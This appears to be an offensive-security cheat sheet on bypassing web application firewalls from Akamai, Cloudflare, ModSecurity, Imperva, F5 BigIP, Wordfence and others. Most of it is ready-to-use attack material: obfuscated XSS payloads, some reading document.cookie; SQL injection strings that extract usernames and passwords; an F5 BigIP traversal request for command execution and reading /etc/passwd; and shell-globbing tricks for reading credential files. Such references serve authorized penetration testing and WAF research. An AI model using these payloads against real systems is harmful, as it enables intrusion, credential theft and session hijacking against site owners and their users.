# WAFs

## WAF Bypasses

**Encoding Evasion**: Use URL, Unicode, Base64, or other encodings to disguise payloads.

**HTTP Parameter Pollution**: Manipulate parameters to exploit the way the WAF processes multi-instance parameters. (One of my favourite techniques!)

**Session Splicing**: Divide the attack into multiple requests or sessions to disrupt the WAF's ability to correlate the events.

**Verb Tampering**: Change the HTTP method (GET, POST, HEAD, etc.) to an unconventional one that the WAF might not inspect.

**Path Obfuscation**: Include irrelevant path information that gets ignored by the server but confuses the WAF (like using directory traversal techniques).

**Query String Manipulation**: Alter the query string with special characters or payloads that might be overlooked by the WAF.

**Header Manipulation**: Modify HTTP headers such as `User-Agent`, `Referer`, or custom headers in ways that are not expected.

**Cookie Poisoning**: Inject payloads into cookie values which may not be inspected or properly sanitized by the WAF.

**Content-Type Evasion**: Use unusual or mismatched content-types in the HTTP header to bypass checks that are content-type specific.

**Extension Manipulation**: Changing file extensions or using obscure ones to evade filters that inspect file names.

**Protocol-Level Evasion**: Utilize discrepancies in protocol implementations (like ambiguous requests) that may be differently interpreted by the WAF and the target web server.

**Attack Obfuscation with Legitimate Requests**: Mix in legitimate traffic with the attack traffic to reduce the anomaly score that might otherwise trigger the WAF.

**Bypassing with JavaScript**: Use JavaScript to construct the final payload in the client-side browser, which may not be executed or recognized by the WAF.

**Using Comment Injection**: Place comments within SQL statements or scripts to disrupt signature detection.

**Utilizing Server-Side Request Forgery (SSRF)**: Exploit the server's functionality to make requests that bypass the WAF's rules.

**Timing Attacks**: Execute actions with delays, leveraging the fact that some WAFs have a time window for rule execution.

**Ruleset Flaws**: Exploit known weaknesses in the rulesets employed by popular WAFs, which are sometimes documented by security researchers.

{% embed url="https://waf-bypass.com/" %}

bash usage example:

```bash
bypass-firewalls-by-DNS-history.sh -d example.com
```

References:

* https://github.com/vincentcox/bypass-firewalls-by-DNS-history
* https://github.com/RedSection/pFuzz
* https://github.com/nemesida-waf/waf-bypass
* Domain IP history: https://viewdns.info/iphistory/
* Bypasses and info:
  * https://github.com/0xInfection/Awesome-WAF
  * https://github.com/waf-bypass-maker/waf-community-bypasses

***

## Manual identification

```bash
dig +short target.com
curl -s https://ipinfo.io/<ip address> | jq -r '.com'
```

Always check DNS History for original IP leak:

* https://whoisrequest.com/history/

***

## WAF detection

```bash
nmap --script=http-waf-fingerprint victim.com
nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 victim.com
nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro " victim.com
wafw00f victim.com
```

***

## Good bypass payload examples

```
%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0It%0A%3Aalert(0)
javascript:”/*’/*`/* →<html \” onmouseover=/*&lt;svg/*/onload=alert()//>
```

Try accessing alternate hostnames or paths that may reveal origin servers:

* dev.domain.com
* stage.domain.com
* ww1/ww2/ww3...domain.com
* www.domain.uk/jp/

***

## Akamai

Target origin hostnames:

* origin.sub.domain.com
* origin-sub.domain.com

Send header:

```
Pragma: akamai-x-get-true-cache-key
```

Payload examples:

```
{{constructor.constructor(alert`1`)()}}
\');confirm(1);//
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
```

***

## ModSecurity Bypass

```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

***

## Cloudflare

```bash
python3 cloudflair.py domain.com
```

Cloudflare enumeration:

* https://github.com/mandatoryprogrammer/cloudflare\_enum
  * Example: cloudflare\_enum.py disney.com
* https://viewdns.info/iphistory/?domain=domain.com
* https://whoisrequest.com/history/

Cloudflare bypass payload examples:

```html
<!<script>alert(1)</script>
<a href=”j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this[‘document’][‘cookie’]&rpar;”>X</a>
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert'1';>
<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
<a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’
```

***

## Aqtronix WebKnight WAF

SQLi examples:

```sql
0 union(select 1,@@hostname,@@datadir)
0 union(select 1,username,password from(users))
```

XSS examples:

```html
<details ontoggle=alert(document.cookie)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
```

***

## ModSecurity (more payloads)

XSS:

```
<scr%00ipt>alert(document.cookie)</scr%00ipt>
onmouseover%0B=
ontoggle%0B%3D
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(“123”)>
```

SQLi:

```
1+uni%0Bon+se%0Blect+1,2,3
```

***

## Imperva Incapsula

Reference: https://medium.com/@0xpegg/imperva-waf-bypass-96360189c3c5

Example payloads (URL-encoded/complex XSS):

```
url.com/search?search=%3E%3C/span%3E%3Cp%20onmouseover=%27p%3D%7E%5B%5D%3Bp%3D%7B%5F%5F%5F%3A%2B%2Bp%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%5F%24%3A%2B%2Bp%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%24%5F%3A%2B%2Bp%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%24%3A%28p%5Bp%5D%2B%22%22%29%5Bp%5D%2C%5F%24%24%3A%2B%2Bp%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5Bp%5D%2C%24%5F%5F%3A%2B%2Bp%2C%24%5F%24%3A%2B%2Bp%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%3A%2B%2Bp%2C%24%24%24%3A%2B%2Bp%2C%24%5F%5F%5F%3A%2B%2Bp%2C%24%5F%5F%24%3A%2B%2Bp%7D%3Bp%2E%24%5F%3D%28p%2E%24%5F%3Dp%2B%22%22%29%5Bp%2E%24%5F%24%5D%2B%28p%2E%5F%24%3Dp%2E%24%5F%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%24%24%3D%28p%2E%24%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28%28%21p%29%2B%22%22%29%5Bp%2E%5F%24%24%5D%2B%28p%2E%5F%5F%3Dp%2E%24%5F%5Bp%2E%24%24%5F%5D%29%2B%28p%2E%24%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%5F%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%5F%5D%29%2Bp%2E%24%5F%5Bp%2E%24%5F%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%24%2Bp%2E%24%3Bp%2E%24%24%3Dp%2E%24%2B%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%2Bp%2E%24%2Bp%2E%24%24%3Bp%2E%24%3D%28p%2E%5F%5F%5F%29%5Bp%2E%24%5F%5D%5Bp%2E%24%5F%5D%3Bp%2E%24%28p%2E%24%28p%2E%24%24%2B%22%5C%22%22%2Bp%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%24%24%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2Bp%2E%5F%5F%2B%22%28%5C%5C%5C%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%5F%2Bp%2E%24%24%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%5F%24%2B%22%2C%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%24%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%5F%24%2Bp%2E%5F%5F%24%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%5F%5F%2Bp%2E%5F%5F%2B%22%5C%5C%5C%22%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3B%27%3E
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
```

Parameter pollution / SQLi examples:

```
http://www.website.com/page.asp?a=nothing'/*&a=*/or/*&a=*/1=1/*&a=*/--+-
http://www.website.com/page.asp?a=nothing'/*&a%00=*/or/*&a=*/1=1/*&a%00=*/--+-
```

XSS (encoded payload example):

```
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
<img/src="x"/onerror="[7 char payload goes here]">
```

***

## FAIL2BAN SQLi

```sql
(SELECT 6037 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(6037=6037,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

***

## F5 BigIP

RCE example:

```bash
curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
```

Read file example:

```bash
curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
```

XSS examples:

```html
<body style="height:1000px" onwheel=alert(“123”)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow=alert(“123”)>
<body style="height:1000px" onwheel="[JS-F**k Payload]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
```

JS-F\*\*k style payload examples (obfuscated):

```
(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+...
```

Encoded onwheel example:

```
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
```

***

## More payloads and collections

* https://github.com/Walidhossain010/WAF-bypass-xss-payloads

***

## Wordfence

```html
<meter onmouseover="alert(1)"
'">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>
```

***

## RCE WAF globbing bypass

```
/usr/bin/cat /etc/passwd ==  /???/???/c?t$IFS/???/p?s?w?
cat /etc$u/p*s*wd$u
```

***

## Additional payload examples (Cloudflare/ModSecurity/others)

```html
<!<script>alert(1)</script>
<a href=”j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this[‘document’][‘cookie’]&rpar;”>X</a>
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert'1';>
<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
<a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’
```

***

## Images

![](<../../.gitbook/assets/image (2621)>)

![](<../../.gitbook/assets/image (2622)>)

***

Last updated: 2 years ago
